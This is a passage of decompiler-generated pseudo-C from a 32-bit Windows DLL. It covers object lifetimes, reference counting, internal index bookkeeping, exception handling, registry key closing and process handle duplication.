  sub_10001236((LONG *)(v8 + 4), (LONG *)(a1 + 36));
  LOBYTE(v12) = 4;
  sub_1000D3AD(v11);
  LOBYTE(v12) = 3;
  sub_1000EDA4(v10);
  v12 = -1;
  sub_10007D7A((void **)&a2);
  return a1;
}
// 1010256C: using guessed type int (__thiscall *off_1010256C)(void *Block, char);

//----- (10010E97) --------------------------------------------------------
void *__thiscall sub_10010E97(void *Block, char a2)
{
  sub_100016A1((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10010EB7) --------------------------------------------------------
int __thiscall sub_10010EB7(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *, void *))(*this[4] + 72))(this[4], &unk_101868C4);
}

//----- (10010EC5) --------------------------------------------------------
_DWORD *__thiscall sub_10010EC5(int *this, _DWORD *a2, void *Block)
{
  int v4; // eax
  int v5; // eax
  int v7; // [esp-10h] [ebp-48h] BYREF
  volatile LONG *v8; // [esp-Ch] [ebp-44h]
  int v9; // [esp-8h] [ebp-40h] BYREF
  int v10; // [esp-4h] [ebp-3Ch]
  _DWORD *v11[2]; // [esp+Ch] [ebp-2Ch] BYREF
  int v12; // [esp+14h] [ebp-24h] BYREF
  volatile LONG *v13; // [esp+18h] [ebp-20h]
  int *v14; // [esp+1Ch] [ebp-1Ch]
  void *v15; // [esp+20h] [ebp-18h]
  int v16; // [esp+24h] [ebp-14h]
  int v17; // [esp+34h] [ebp-4h]
  void *Blocka; // [esp+44h] [ebp+Ch]

  v16 = 0;
  sub_1000EDE4(this, v11);
  v17 = 1;
  v4 = (*(int (__thiscall **)(int *, void *))(*this + 40))(this, Block);
  sub_1001131B(this, &v12, v4);
  LOBYTE(v17) = 2;
  Blocka = operator new(0x28u);
  LOBYTE(v17) = 3;
  if ( Blocka )
  {
    v9 = v10;
    v15 = &v9;
    sub_1000D372(&v9, (int)&unk_101868E4);
    LOBYTE(v17) = 4;
    v8 = v13;
    v14 = &v7;
    v7 = v12;
    InterlockedIncrement(v13);
    LOBYTE(v17) = 3;
    v5 = sub_1000F1B1((int)Blocka, v7, v8, v9, v10);
  }
  else
  {
    v5 = 0;
  }
  LOBYTE(v17) = 2;
  sub_1000728E(a2, v5);
  v16 = 1;
  LOBYTE(v17) = 1;
  sub_10007D7A((void **)&v12);
  LOBYTE(v17) = 0;
  sub_1000EDA4(v11);
  return a2;
}

//----- (10010F97) --------------------------------------------------------
_DWORD *__thiscall sub_10010F97(int this, _DWORD *a2, void *Block)
{
  int v4; // edi
  int v5; // eax
  void *v6; // eax
  void *v7; // edi
  int v8; // eax
  int v9; // ebx
  int v10; // eax
  int v12; // [esp-10h] [ebp-4Ch] BYREF
  volatile LONG *v13; // [esp-Ch] [ebp-48h]
  int v14; // [esp-8h] [ebp-44h] BYREF
  int v15; // [esp-4h] [ebp-40h]
  _DWORD *v16[2]; // [esp+Ch] [ebp-30h] BYREF
  int v17; // [esp+14h] [ebp-28h] BYREF
  volatile LONG *v18; // [esp+18h] [ebp-24h]
  _DWORD *v19[2]; // [esp+1Ch] [ebp-20h] BYREF
  int v20; // [esp+24h] [ebp-18h]
  void *v21; // [esp+28h] [ebp-14h]
  int v22; // [esp+2Ch] [ebp-10h] BYREF
  int v23; // [esp+38h] [ebp-4h]
  void *Blocka; // [esp+48h] [ebp+Ch]
  void *Blockb; // [esp+48h] [ebp+Ch]

  v20 = 0;
  sub_1000EDE4((int *)this, v16);
  v23 = 1;
  sub_1000EDE4((int *)this, v19);
  LOBYTE(v23) = 2;
  v4 = (*(int (__thiscall **)(_DWORD, void *))(**(_DWORD **)(this + 16) + 72))(*(_DWORD *)(this + 16), &unk_101868EC);
  v5 = v4 + 1;
  if ( v4 == -1 )
    v5 = 1;
  (*(void (__thiscall **)(_DWORD, void *, int))(**(_DWORD **)(this + 16) + 40))(
    *(_DWORD *)(this + 16),
    &unk_101868EC,
    v5);
  LOBYTE(v23) = 1;
  sub_1000EDA4(v19);
  v22 = v4;
  sub_1001131B((_DWORD *)this, &v17, v4);
  LOBYTE(v23) = 3;
  v6 = (void *)(*(int (__thiscall **)(_DWORD, void *))(**(_DWORD **)(this + 16) + 72))(
                 *(_DWORD *)(this + 16),
                 &unk_101868C4);
  v7 = Block;
  v21 = v6;
  if ( Block == (void *)-1 )
    v7 = v6;
  v8 = sub_10011516((_DWORD *)this);
  (*(void (__thiscall **)(int, int *, void *))(*(_DWORD *)v8 + 32))(v8, &v22, v7);
  v9 = 0;
  if ( (*(int (__thiscall **)(int))(*(_DWORD *)this + 24))(this) )
  {
    if ( v7 == v21 )
    {
      v15 = -1;
LABEL_10:
      v9 = (*(int (__thiscall **)(int, int))(*(_DWORD *)this + 40))(this, v15);
      goto LABEL_11;
    }
    if ( v7 )
    {
      v15 = (int)v7 - 1;
      goto LABEL_10;
    }
  }
LABEL_11:
  Blocka = 0;
  if ( v7 != v21 && (*(int (__thiscall **)(int))(*(_DWORD *)this + 24))(this) )
    Blocka = (void *)(*(int (__thiscall **)(int, void *))(*(_DWORD *)this + 40))(this, v7);
  sub_10011464(v9, v22, this);
  sub_10011464(v22, (int)Blocka, this);
  (*(void (__thiscall **)(_DWORD, void *, char *))(**(_DWORD **)(this + 16) + 40))(
    *(_DWORD *)(this + 16),
    &unk_101868C4,
    (char *)v21 + 1);
  Blockb = operator new(0x28u);
  LOBYTE(v23) = 4;
  if ( Blockb )
  {
    v14 = v15;
    v21 = &v14;
    sub_1000D372(&v14, (int)&unk_101868E4);
    LOBYTE(v23) = 5;
    v13 = v18;
    v19[1] = &v12;
    v12 = v17;
    InterlockedIncrement(v18);
    LOBYTE(v23) = 4;
    v10 = sub_1000F1B1((int)Blockb, v12, v13, v14, v15);
  }
  else
  {
    v10 = 0;
  }
  LOBYTE(v23) = 3;
  sub_1000728E(a2, v10);
  v20 = 1;
  LOBYTE(v23) = 1;
  sub_10007D7A((void **)&v17);
  LOBYTE(v23) = 0;
  sub_1000EDA4(v16);
  return a2;
}

//----- (1001113A) --------------------------------------------------------
int __thiscall sub_1001113A(int *this, int a2)
{
  int v3; // ebx
  int v4; // edi
  int v5; // eax
  int v6; // edi
  _DWORD *v7; // eax
  int v8; // eax
  char ArgList[4]; // [esp+18h] [ebp-28h] BYREF
  int v11[2]; // [esp+20h] [ebp-20h] BYREF
  _DWORD *v12[3]; // [esp+28h] [ebp-18h] BYREF
  int v13; // [esp+3Ch] [ebp-4h]

  sub_1000EDE4(this, v12);
  v13 = 0;
  *(_DWORD *)ArgList = (*(int (__thiscall **)(int *, int))(*this + 40))(this, a2);
  sub_1001131B(this, v11, *(int *)ArgList);
  LOBYTE(v13) = 1;
  v3 = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v11[0] + 72))(v11[0], &unk_101868DC);
  v4 = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v11[0] + 72))(v11[0], &unk_101868BC);
  v5 = sub_10011516(this);
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v5 + 40))(v5, a2);
  sub_10011464(v3, v4, (int)this);
  v6 = this[4];
  v7 = sub_100112CD(ArgList, *(int *)ArgList);
  LOBYTE(v13) = 2;
  (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v6 + 100))(v6, v7);
  LOBYTE(v13) = 1;
  sub_1000D3AD((int *)ArgList);
  v8 = (*(int (__thiscall **)(int, void *))(*(_DWORD *)this[4] + 72))(this[4], &unk_101868C4);
  (*(void (__thiscall **)(int, void *, int))(*(_DWORD *)this[4] + 40))(this[4], &unk_101868C4, v8 - 1);
  LOBYTE(v13) = 0;
  sub_10007D7A((void **)v11);
  v13 = -1;
  return sub_1000EDA4(v12);
}

//----- (10011236) --------------------------------------------------------
int __thiscall sub_10011236(int this)
{
  int v2; // eax
  _DWORD *v4[3]; // [esp+8h] [ebp-18h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  sub_1000EDE4((int *)this, v4);
  v5 = 0;
  (*(void (__thiscall **)(_DWORD, void *))(**(_DWORD **)(this + 16) + 100))(*(_DWORD *)(this + 16), &unk_10186920);
  (*(void (__thiscall **)(_DWORD, void *, _DWORD))(**(_DWORD **)(this + 16) + 40))(
    *(_DWORD *)(this + 16),
    &unk_101868C4,
    0);
  (*(void (__thiscall **)(_DWORD, void *, _DWORD))(**(_DWORD **)(this + 16) + 40))(
    *(_DWORD *)(this + 16),
    &unk_101868CC,
    0);
  (*(void (__thiscall **)(_DWORD, void *, _DWORD))(**(_DWORD **)(this + 16) + 40))(
    *(_DWORD *)(this + 16),
    &unk_101868D4,
    0);
  (*(void (__thiscall **)(_DWORD, void *, int))(**(_DWORD **)(this + 16) + 40))(
    *(_DWORD *)(this + 16),
    &unk_101868EC,
    1);
  v2 = sub_10011516((_DWORD *)this);
  (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 52))(v2);
  v5 = -1;
  return sub_1000EDA4(v4);
}

//----- (100112C2) --------------------------------------------------------
int __thiscall sub_100112C2(_DWORD **this)
{
  return sub_1000EC84(this[4]);
}

//----- (100112CD) --------------------------------------------------------
_DWORD *__stdcall sub_100112CD(_DWORD *a1, int ArgList)
{
  sub_1000D17D(a1, &word_1017A330);
  sub_1000D6C3((int)a1, aD, ArgList);
  return a1;
}

//----- (1001131B) --------------------------------------------------------
_DWORD *__thiscall sub_1001131B(_DWORD *this, _DWORD *a2, int ArgList)
{
  int v4; // eax
  int v6; // [esp-10h] [ebp-30h]
  volatile LONG *v7; // [esp-Ch] [ebp-2Ch]
  int v8; // [esp-8h] [ebp-28h] BYREF
  int v9; // [esp-4h] [ebp-24h]
  void *v10; // [esp+8h] [ebp-18h]
  int v11; // [esp+Ch] [ebp-14h]
  void *Block; // [esp+10h] [ebp-10h]
  int v13; // [esp+1Ch] [ebp-4h]

  v11 = 0;
  Block = operator new(0x28u);
  v13 = 1;
  if ( Block )
  {
    v8 = v9;
    v10 = &v8;
    sub_100112CD(&v8, ArgList);
    LOBYTE(v13) = 2;
    v7 = (volatile LONG *)this[5];
    v6 = this[4];
    InterlockedIncrement(v7);
    LOBYTE(v13) = 1;
    v4 = sub_1000F1B1((int)Block, v6, v7, v8, v9);
  }
  else
  {
    v4 = 0;
  }
  LOBYTE(v13) = 0;
  sub_1000728E(a2, v4);
  return a2;
}

//----- (100113AD) --------------------------------------------------------
int __thiscall sub_100113AD(int *this, unsigned int a2)
{
  unsigned int v3; // eax
  unsigned int v4; // edi
  _DWORD *v5; // eax
  int v6; // eax
  int *v7; // eax
  int v8; // eax
  int v9; // esi
  int v11; // [esp+Ch] [ebp-1Ch] BYREF
  _DWORD *v12[3]; // [esp+10h] [ebp-18h] BYREF
  int v13; // [esp+24h] [ebp-4h]

  sub_1000EDE4(this, v12);
  v13 = 0;
  v3 = (*(int (__thiscall **)(int *))(*this + 24))(this);
  v4 = v3;
  if ( !v3 )
  {
    v5 = sub_1000E8EF(&v11);
    LOBYTE(v13) = 1;
    goto LABEL_3;
  }
  if ( a2 == -1 )
  {
    v6 = sub_10011516(this);
    v7 = (int *)(*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)v6 + 44))(v6, v4 - 1);
  }
  else
  {
    if ( a2 >= v3 )
    {
      v5 = sub_1000E8EF(&v11);
      LOBYTE(v13) = 2;
LABEL_3:
      sub_100078FE((int)v5);
    }
    v8 = sub_10011516(this);
    v7 = (int *)(*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)v8 + 44))(v8, a2);
  }
  v9 = *v7;
  v13 = -1;
  sub_1000EDA4(v12);
  return v9;
}

//----- (10011464) --------------------------------------------------------
void __usercall sub_10011464(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3[3]; // [esp+10h] [ebp-18h] BYREF
  int v4; // [esp+24h] [ebp-4h]

  if ( a1 )
  {
    sub_1001131B((_DWORD *)a3, v3, a1);
    v4 = 0;
    (*(void (__thiscall **)(int, void *, int))(*(_DWORD *)v3[0] + 40))(v3[0], &unk_101868BC, a2);
    v4 = -1;
    sub_10007D7A((void **)v3);
  }
  else
  {
    (*(void (__thiscall **)(_DWORD, void *, int))(**(_DWORD **)(a3 + 16) + 40))(*(_DWORD *)(a3 + 16), &unk_101868CC, a2);
  }
  if ( a2 )
  {
    sub_1001131B((_DWORD *)a3, v3, a2);
    v4 = 1;
    (*(void (__thiscall **)(int, void *, int))(*(_DWORD *)v3[0] + 40))(v3[0], &unk_101868DC, a1);
    v4 = -1;
    sub_10007D7A((void **)v3);
  }
  else
  {
    (*(void (__thiscall **)(_DWORD, void *, int))(**(_DWORD **)(a3 + 16) + 40))(*(_DWORD *)(a3 + 16), &unk_101868D4, a1);
  }
}

//----- (10011516) --------------------------------------------------------
int __usercall sub_10011516@<eax>(_DWORD *a1@<esi>)
{
  int *v1; // edi
  int v2; // edx
  unsigned int v3; // ebx
  unsigned int v4; // ebx
  _DWORD *v5; // eax
  int ArgList; // [esp+10h] [ebp-30h] BYREF
  _DWORD *v8; // [esp+14h] [ebp-2Ch]
  int v9[2]; // [esp+18h] [ebp-28h] BYREF
  int v10[5]; // [esp+20h] [ebp-20h] BYREF
  int v11; // [esp+3Ch] [ebp-4h]

  v1 = (int *)a1[6];
  v2 = *v1;
  v8 = a1 + 8;
  if ( !(*(unsigned __int8 (__thiscall **)(int *, _DWORD *))(v2 + 8))(v1, a1 + 8) )
  {
    v3 = (*(int (__thiscall **)(_DWORD *))(*a1 + 24))(a1);
    sub_1001160C(v10, v3);
    v11 = 0;
    ArgList = (*(int (__thiscall **)(_DWORD, void *))(*(_DWORD *)a1[4] + 72))(a1[4], &unk_101868CC);
    sub_10007469(v10, (int)&ArgList);
    if ( v3 > 1 )
    {
      v4 = v3 - 1;
      do
      {
        v5 = sub_1001131B(a1, v9, ArgList);
        LOBYTE(v11) = 1;
        ArgList = (*(int (__thiscall **)(_DWORD, void *))(*(_DWORD *)*v5 + 72))(*v5, &unk_101868BC);
        LOBYTE(v11) = 0;
        sub_10007D7A((void **)v9);
        sub_10007469(v10, (int)&ArgList);
        --v4;
      }
      while ( v4 );
    }
    (*(void (__thiscall **)(int *, _DWORD *, int *))(*v1 + 24))(v1, v8, v10);
    v11 = -1;
    sub_100079EC((int)v10);
  }
  return (*(int (__thiscall **)(int *, _DWORD *))(*v1 + 16))(v1, v8);
}
// 10011516: using guessed type int var_20[5];

//----- (1001160C) --------------------------------------------------------
_DWORD *__stdcall sub_1001160C(_DWORD *a1, unsigned int a2)
{
  unsigned int v2; // eax

  sub_1000A901(a1);
  v2 = 1;
  for ( *a1 = &off_100FC020; v2 < a2; v2 *= 2 )
    ;
  sub_10008295(v2, a1);
  return a1;
}
// 100FC020: using guessed type int (__thiscall *off_100FC020)(void *Block, char);

//----- (10011653) --------------------------------------------------------
_DWORD *__stdcall sub_10011653(_DWORD *a1)
{
  *a1 = &unk_101025A0;
  a1[2] = &unk_101025AC;
  sub_1000E7F7(1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(a1[2] + 4) + 8) = &off_101022EC;
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10102598;
  return a1;
}
// 1000E7F7: using guessed type _DWORD __stdcall sub_1000E7F7(char, _DWORD);
// 101022EC: using guessed type int (__stdcall *off_101022EC)(char);
// 10102598: using guessed type int (__stdcall *off_10102598)(char);

//----- (100116C3) --------------------------------------------------------
char *__thiscall sub_100116C3(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 1);
  sub_100116E5(this - 1);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (100116E5) --------------------------------------------------------
void __thiscall sub_100116E5(_DWORD *this)
{
  _DWORD *v2; // ecx

  v2 = this + 1;
  *(_DWORD *)((char *)v2 + *(_DWORD *)(*(v2 - 1) + 4) - 4) = &off_10102598;
  *(_DWORD *)((char *)this + *(_DWORD *)(this[2] + 4) + 8) = &off_101022EC;
  sub_1000E843(v2);
}
// 101022EC: using guessed type int (__stdcall *off_101022EC)(char);
// 10102598: using guessed type int (__stdcall *off_10102598)(char);

//----- (1001170B) --------------------------------------------------------
void *__thiscall sub_1001170B(_BYTE *this)
{
  void *result; // eax

  result = &loc_100A06CF;
  this[4] = 1;
  return result;
}

//----- (10011741) --------------------------------------------------------
void __thiscall sub_10011741(_BYTE *this)
{
  this[4] = 1;
}

//----- (10011746) --------------------------------------------------------
unsigned int __thiscall sub_10011746(void *this, _DWORD *a2)
{
  unsigned int result; // eax
  unsigned int i; // esi
  int v5; // eax
  _DWORD *v6; // eax
  int v7[5]; // [esp+Ch] [ebp-2Ch] BYREF
  int v8[3]; // [esp+20h] [ebp-18h] BYREF
  int v9; // [esp+34h] [ebp-4h]

  result = a2[3];
  for ( i = 0; i < result; result = a2[3] )
  {
    sub_1000B6B7(a2, (int)v7, i, result - i);
    v9 = 0;
    v5 = (*(int (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v7);
    if ( !v5 )
    {
      v6 = sub_10011653(v8);
      LOBYTE(v9) = 1;
      sub_100117C0((int)v6, 63);
    }
    i += v5;
    v9 = -1;
    sub_1000B3DF(v7);
  }
  return result;
}
// 10011746: using guessed type int var_2C[5];
// 10011746: using guessed type int var_18[3];

//----- (100117C0) --------------------------------------------------------
void __cdecl __noreturn sub_100117C0(int a1, int a2)
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_100117E5(pExceptionObject, a1, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNxgFdIyuzpwZmeagwnxg_yq_sr__);
}
// 100117C0: using guessed type _DWORD pExceptionObject[3];

//----- (100117E5) --------------------------------------------------------
_DWORD *__thiscall sub_100117E5(_DWORD *this, int a2, int a3)
{
  int v4; // eax
  int v5; // eax

  if ( a3 )
  {
    *this = &unk_101025A0;
    this[2] = &unk_101025AC;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_1000E7B3(this + 1, v4);
    if ( a2 )
      v5 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 8);
    else
      v5 = 0;
    sub_1000CADA(this + 2, v5, 0);
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10102598;
  return this;
}
// 10102598: using guessed type int (__stdcall *off_10102598)(char);

//----- (1001187B) --------------------------------------------------------
int __stdcall sub_1001187B(int a1, int a2, int a3)
{
  _DWORD *v3; // eax
  volatile LONG *v5; // [esp-8h] [ebp-28h] BYREF
  size_t v6; // [esp-4h] [ebp-24h]
  volatile LONG **v7; // [esp+Ch] [ebp-14h]
  void *Block; // [esp+10h] [ebp-10h]
  int v9; // [esp+1Ch] [ebp-4h]

  v9 = 0;
  *(_BYTE *)(a1 + 4) = 0;
  v6 = 40;
  *(_DWORD *)a1 = &off_101025B4;
  Block = operator new(v6);
  LOBYTE(v9) = 2;
  if ( Block )
  {
    v5 = (volatile LONG *)v6;
    v7 = &v5;
    sub_1000B964(&v5);
    LOBYTE(v9) = 2;
    v3 = sub_1000BA6E(-1, 0x80000000, Block, (int)&a2, 128, -1, (int)v5, (volatile LONG *)v6);
  }
  else
  {
    v3 = 0;
  }
  LOBYTE(v9) = 1;
  sub_10050B91((_DWORD *)(a1 + 8), (int)v3);
  LOBYTE(v9) = 4;
  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
  *(_BYTE *)(a1 + 16) = 1;
  v9 = -1;
  sub_1000D3AD(&a2);
  return a1;
}
// 101025B4: using guessed type int (__thiscall *off_101025B4)(void *Block, char);

//----- (10011923) --------------------------------------------------------
_BYTE *__thiscall sub_10011923(_BYTE *Block, char a2)
{
  sub_100119B4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10011942) --------------------------------------------------------
int __stdcall sub_10011942(int a1, int a2, volatile LONG *lpAddend)
{
  volatile LONG *v3; // eax
  int v4; // ecx

  *(_BYTE *)(a1 + 4) = 0;
  v3 = lpAddend;
  v4 = a2;
  *(_DWORD *)a1 = &off_101025B4;
  *(_DWORD *)(a1 + 12) = v3;
  *(_DWORD *)(a1 + 8) = v4;
  InterlockedIncrement(v3);
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 12))(*(_DWORD *)(a1 + 8)) )
  {
    *(_BYTE *)(a1 + 16) = 0;
  }
  else
  {
    (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
    *(_BYTE *)(a1 + 16) = 1;
  }
  sub_10020B81(&a2);
  return a1;
}
// 101025B4: using guessed type int (__thiscall *off_101025B4)(void *Block, char);

//----- (100119B4) --------------------------------------------------------
void *__thiscall sub_100119B4(_BYTE *this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_101025B4;
  v4 = 2;
  sub_10011A75(this);
  v4 = 0;
  sub_10020B81(this + 8);
  v4 = -1;
  return sub_1001170B(this);
}
// 101025B4: using guessed type int (__thiscall *off_101025B4)(void *Block, char);

//----- (10011A1B) --------------------------------------------------------
int __thiscall sub_10011A1B(_DWORD **this, _BYTE *a2)
{
  __int16 v2; // ax

  v2 = (*(int (__thiscall **)(_DWORD *))(*this[2] + 52))(this[2]);
  if ( v2 == -1 )
    return 0;
  *a2 = v2;
  return 1;
}

//----- (10011A3E) --------------------------------------------------------
int __thiscall sub_10011A3E(_DWORD **this, int a2)
{
  int v2; // eax

  v2 = (*(int (__thiscall **)(_DWORD *, int))(*this[2] + 48))(this[2], a2);
  return v2 != -1 ? v2 : 0;
}

//----- (10011A59) --------------------------------------------------------
int __thiscall sub_10011A59(_DWORD **this)
{
  int v2; // edi

  v2 = (*(int (__thiscall **)(_DWORD *))(*this[2] + 120))(this[2]);
  return v2 - ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
}

//----- (10011A75) --------------------------------------------------------
int __thiscall sub_10011A75(_BYTE *this)
{
  int result; // eax
  bool v3; // zf

  result = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 36))(this);
  if ( !(_BYTE)result )
  {
    v3 = this[16] == 0;
    this[4] = 1;
    if ( !v3 )
      return (*(int (__thiscall **)(_DWORD))(**((_DWORD **)this + 2) + 8))(*((_DWORD *)this + 2));
  }
  return result;
}

//----- (10011A95) --------------------------------------------------------
int __thiscall sub_10011A95(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 72))(this[2]);
}

//----- (10011A9D) --------------------------------------------------------
int __thiscall sub_10011A9D(void *this, int a2, int a3)
{
  return sub_10011AB3(a3, (int)this, a2, a2 >> 31);
}

//----- (10011AB3) --------------------------------------------------------
int __userpurge sub_10011AB3@<eax>(int a1@<eax>, int a2, int a3, int a4)
{
  int v4; // edx
  int v5; // eax

  v4 = 0;
  if ( a1 )
  {
    v5 = a1 - 1;
    if ( v5 )
    {
      if ( v5 == 1 )
        v4 = 2;
    }
    else
    {
      v4 = 1;
    }
  }
  return (*(int (__thiscall **)(_DWORD, int, int, int))(**(_DWORD **)(a2 + 8) + 68))(*(_DWORD *)(a2 + 8), a3, a4, v4);
}

//----- (10011AE0) --------------------------------------------------------
_DWORD *__usercall sub_10011AE0@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>)
{
  volatile LONG *v2; // ecx

  v2 = (volatile LONG *)a1[1];
  a2[1] = v2;
  *a2 = *a1;
  InterlockedIncrement(v2);
  return a2;
}

//----- (10011AF4) --------------------------------------------------------
int __userpurge sub_10011AF4@<eax>(int a1@<esi>, void *a2, char a3, BOOL a4, DWORD a5, DWORD a6)
{
  *(_DWORD *)(a1 + 4) = 0;
  *(_DWORD *)a1 = off_100FC204;
  sub_1000A198((HANDLE *)a1, a2, a3, a4, a5, a6);
  return a1;
}
// 100FC204: using guessed type int (__thiscall *off_100FC204[2])(void *Block, char);

//----- (10011B1D) --------------------------------------------------------
_DWORD *__usercall sub_10011B1D@<eax>(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax
  _DWORD v5[6]; // [esp+8h] [ebp-18h] BYREF

  a1[1] = 0;
  *a1 = off_101025E0;
  if ( a2 && !sub_10011F8F((int)a1) )
  {
    v3 = sub_1000E9DF(v5, 1, 1);
    v5[5] = 0;
    sub_1000A947(v3, 165);
  }
  a1[1] = a2;
  return a1;
}
// 101025E0: using guessed type int (__thiscall *off_101025E0[7])(void *Block, char);

//----- (10011B71) --------------------------------------------------------
char __stdcall sub_10011B71(int a1)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  v2[6] = 0;
  sub_1001984B(*(HKEY *)(a1 + 4));
  return 1;
}

//----- (10011BB7) --------------------------------------------------------
_DWORD *__usercall sub_10011BB7@<eax>(_DWORD *a1@<esi>)
{
  a1[1] = 0;
  *a1 = off_101025E8;
  sub_10011E5C((int)a1, 0);
  return a1;
}
// 101025E8: using guessed type int (__thiscall *off_101025E8[5])(void *Block, char);

//----- (10011BCF) --------------------------------------------------------
_DWORD *__usercall sub_10011BCF@<eax>(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax
  _DWORD v5[6]; // [esp+4h] [ebp-18h] BYREF

  a1[1] = 0;
  *a1 = off_101025EC;
  if ( a2 && !sub_10011FCD((int)a1) )
  {
    v3 = sub_1000E9DF(v5, 1, 1);
    v5[5] = 0;
    sub_1000A947(v3, 165);
  }
  a1[1] = a2;
  return a1;
}
// 101025EC: using guessed type int (__thiscall *off_101025EC[4])(void *Block, char);

//----- (10011C23) --------------------------------------------------------
void __cdecl sub_10011C23(HANDLE hSourceHandle, BOOL bInheritHandle, DWORD dwProcessId)
{
  HANDLE CurrentProcess; // eax
  DWORD v4; // eax
  _DWORD *v5; // eax
  HANDLE v6[5]; // [esp+Ch] [ebp-34h] BYREF
  DWORD CurrentProcessId; // [esp+28h] [ebp-18h]
  HANDLE TargetHandle; // [esp+2Ch] [ebp-14h]
  int v9; // [esp+3Ch] [ebp-4h]
  void *dwProcessIda; // [esp+50h] [ebp+10h]

  TargetHandle = (HANDLE)-1;
  if ( dwProcessId == GetCurrentProcessId() )
    CurrentProcess = GetCurrentProcess();
  else
    CurrentProcess = OpenProcess(0x40u, 0, dwProcessId);
  dwProcessIda = CurrentProcess;
  CurrentProcessId = GetCurrentProcessId();
  v4 = GetCurrentProcessId();
  v6[3] = off_100FC204;
  v6[4] = 0;
  sub_1000A198(dwProcessIda, 0, 0, v4, CurrentProcessId);
  v9 = 0;
  v5 = sub_1000E9DF(v6, 1, 1);
  LOBYTE(v9) = 1;
  sub_1000A947(v5, 393);
}
// 10011C86: conditional instruction was optimized away because %hSourceProcessHandle.4==0
// 1000A198: using guessed type _DWORD __stdcall sub_1000A198(HANDLE hSourceHandle, char, BOOL bInheritHandle, DWORD dwProcessId, DWORD);
// 100FC204: using guessed type int (__thiscall *off_100FC204[2])(void *Block, char);

//----- (10011D61) --------------------------------------------------------
_DWORD *__thiscall sub_10011D61(_DWORD *Block, char a2)
{
  sub_10011DDD(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10011D80) --------------------------------------------------------
_DWORD *__thiscall sub_10011D80(_DWORD *Block, char a2)
{
  sub_10011EE4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10011D9F) --------------------------------------------------------
_DWORD *__thiscall sub_10011D9F(_DWORD *Block, char a2)
{
  sub_10011E1D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10011DBE) --------------------------------------------------------
_DWORD *__thiscall sub_10011DBE(_DWORD *Block, char a2)
{
  sub_10011EA5(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10011DDD) --------------------------------------------------------
char __thiscall sub_10011DDD(_DWORD *this)
{
  _DWORD v2[8]; // [esp+0h] [ebp-20h] BYREF

  v2[4] = v2;
  *this = off_101025E0;
  v2[7] = 0;
  return sub_10011F8F((int)this);
}
// 101025E0: using guessed type int (__thiscall *off_101025E0[7])(void *Block, char);

//----- (10011E1D) --------------------------------------------------------
bool __thiscall sub_10011E1D(_DWORD *this)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  *this = off_101025E8;
  v2[6] = 0;
  return sub_10011FAC((int)this);
}
// 101025E8: using guessed type int (__thiscall *off_101025E8[5])(void *Block, char);

//----- (10011E5C) --------------------------------------------------------
char __usercall sub_10011E5C@<al>(int a1@<ecx>, int a2@<edi>)
{
  void *v2; // eax
  _DWORD *v4; // eax
  _DWORD v6[6]; // [esp+4h] [ebp-18h] BYREF

  v2 = &loc_100A582F;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(v2) = sub_10011FAC(a1);
    if ( !(_BYTE)v2 )
    {
      v4 = sub_1000E9DF(v6, 1, 1);
      v6[5] = 0;
      sub_1000A947(v4, 165);
    }
  }
  *(_DWORD *)(a1 + 4) = a2;
  return (char)v2;
}

//----- (10011EA5) --------------------------------------------------------
bool __thiscall sub_10011EA5(_DWORD *this)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  *this = off_101025EC;
  v2[6] = 0;
  return sub_10011FCD((int)this);
}
// 101025EC: using guessed type int (__thiscall *off_101025EC[4])(void *Block, char);

//----- (10011EE4) --------------------------------------------------------
bool __thiscall sub_10011EE4(_DWORD *this)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

